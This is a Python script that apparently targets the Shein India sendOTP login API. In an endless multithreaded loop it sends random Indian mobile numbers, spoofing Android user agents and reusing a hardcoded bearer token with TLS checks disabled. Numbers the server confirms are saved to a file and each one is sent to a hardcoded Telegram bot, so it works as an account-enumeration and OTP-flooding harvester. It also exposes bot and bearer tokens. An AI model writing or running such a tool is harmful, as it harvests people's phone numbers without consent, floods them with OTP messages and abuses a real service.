import requests
import random
import time
import json
import threading
import os
import urllib3

# Disable the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──── COLOURS ────
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

# ──── BULK USER AGENTS ────
USER_AGENTS = [
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G960F Build/RP1A.200720.012)",
    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505F Build/QP1A.190711.020)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 10 Pro Build/SKQ1.211006.001)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002)",
    "Dalvik/2.1.0 (Linux; U; Android 12; OnePlus KB2001 Build/SKQ1.211006.001)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)",
    "Dalvik/2.1.0 (Linux; U; Android 10; vivo 1907 Build/QP1A.190711.020)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Realme RMX3085 Build/RKQ1.200826.002)"
]

URL = "https://api.services.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
OUTPUT_FILE = "nm.json"
LOCK = threading.Lock()

BOT_TOKEN        = "8163835939:AAFT63u4jZ3kNt-uMmFH8PBNoE-3mrpBm88"       
USER_ID          = "2011225554"  
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

total_requests = 0
successful_saves = 0
lock_counter = threading.Lock()

def random_indian_number():
    start = random.choice([str(i) for i in range(70, 80)] + [str(i) for i in range(90, 100)])
    return start + str(random.randint(10000000, 99999999))

def send_to_telegram(number, total_saved):
    try:
        msg = f"✅ Working: {number}\nTotal saved now: {total_saved}"
        requests.get(TELEGRAM_API, params={"chat_id": USER_ID, "text": msg}, timeout=6)
    except:
        pass 

def save_number(num):
    global successful_saves
    current_total = 0
    with LOCK:
        data = []
        if os.path.exists(OUTPUT_FILE):
            with open(OUTPUT_FILE, "r") as f:
                try: data = json.load(f)
                except: data = []

        if num not in data:
            data.append(num)
            successful_saves += 1
            with open(OUTPUT_FILE, "w") as f:
                json.dump(data, f, indent=2)
        current_total = successful_saves
    send_to_telegram(num, current_total)

def make_request():
    global total_requests
    number = random_indian_number()
    
    # ──── ROTATING HEADERS ────
    dynamic_headers = {
        "X-Tenant": "B2C",
        "Accept": "application/json",
        "User-Agent": random.choice(USER_AGENTS), # Random User-Agent
        "client_type": "Android/35",
        "client_version": "1.0.12",
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
        "X-TENANT-ID": "SHEIN",
        "ad_id": "ec93c81f-af32-44c6-b1a0-3da640a4a459",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip"
    }

    with lock_counter:
        total_requests += 1
        req_count = total_requests

    try:
        r = requests.post(
            URL,
            headers=dynamic_headers,
            data={"mobileNumber": number},
            timeout=15,
            verify=False 
        )

        if r.status_code == 200:
            color = GREEN
            try:
                if r.json().get("success"):
                    save_number(number)
            except: pass
        else:
            color = RED if r.status_code >= 500 else YELLOW

        print(f"[{CYAN}{req_count:6d}{RESET}] [{number}] => {color}{r.status_code}{RESET} {r.text[:50]}")

    except Exception as e:
        print(f"[{CYAN}{req_count:6d}{RESET}] [{RED}ERROR{RESET}] {number} → {e}")

# ──── MAIN LOOP ────
print(f"{GREEN}Started with Bulk User-Agents. Sending hits to {USER_ID}{RESET}\n")

while True:
    threads = []
    for _ in range(10):
        t = threading.Thread(target=make_request)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    
    time.sleep(0.5)
